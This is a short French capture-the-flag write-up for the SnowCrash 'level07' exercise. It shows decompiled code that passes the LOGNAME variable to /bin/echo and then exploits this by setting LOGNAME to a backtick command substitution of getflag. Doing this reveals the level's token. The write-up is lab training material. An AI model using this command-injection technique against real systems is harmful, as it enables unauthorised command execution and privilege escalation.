# Level 07

On a un exécutable qui s'appelle `level07`, quand on le lance, ça print `level07`

À première vue on pourrait penser qu'il print le nom de l'exécutable, mais en le décompilant avec ghidra on peut voir dans le main qu'il fait
```c
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c,"/bin/echo %s ",pcVar1);
```
il print donc la valeur de la variable d'environnement `LOGNAME`

On a commencé par simplement essayer de remplacer la valeur de LOGNAME par `getflag`
```sh
level07@SnowCrash:~$ LOGNAME=getflag
level07@SnowCrash:~$ ./level07 
getflag
```
Évidemment c'est pas si simple, ça affiche juste `getflag`, mais au moins maintenant on est sur qu'il affiche bien la valeur de `LOGNAME`

En se basant sur ce qu'on a apprit sur les level précédents, on est allés voir s'il existe une syntaxe de command substitution en bash comme on a pu voir en perl ou en php: https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html

on essaye donc avec `getflag` dans des backtick et bingo:
```sh
level07@SnowCrash:~$ LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```